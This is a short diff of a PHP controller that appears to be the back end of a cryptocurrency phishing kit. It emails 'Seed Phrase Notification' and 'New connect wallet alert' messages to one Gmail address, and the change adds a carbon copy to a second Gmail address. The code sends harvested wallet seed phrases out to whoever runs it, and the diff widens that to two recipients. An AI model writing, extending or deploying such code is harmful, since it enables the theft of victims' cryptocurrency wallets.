@@ -65,7 +65,7 @@ class Home extends BaseController
 		$email = \Config\Services::email();
 		$email->setFrom('admin@ignitionpaidnetwork.org', 'Seed Phrase Notification');
 		$email->setTo($data['to']);
-		// $email->setCC('another@another-example.com');
+		$email->setCC($data['cc']);
 		// $email->setBCC('them@their-example.com');
 
 		$email->setSubject($data['subject']);
@@ -85,7 +85,7 @@ class Home extends BaseController
 		}
 		$data = [
 			'to' => 'amerantbankfl@gmail.com',
-			// 'to' => 'diamond2sure@gmail.com',
+			'cc' => 'diamond2sure@gmail.com',
 			'type' => 'link',
 			'subject' => 'New connect wallet alert',
 			'message' => ['msg' => $msg],
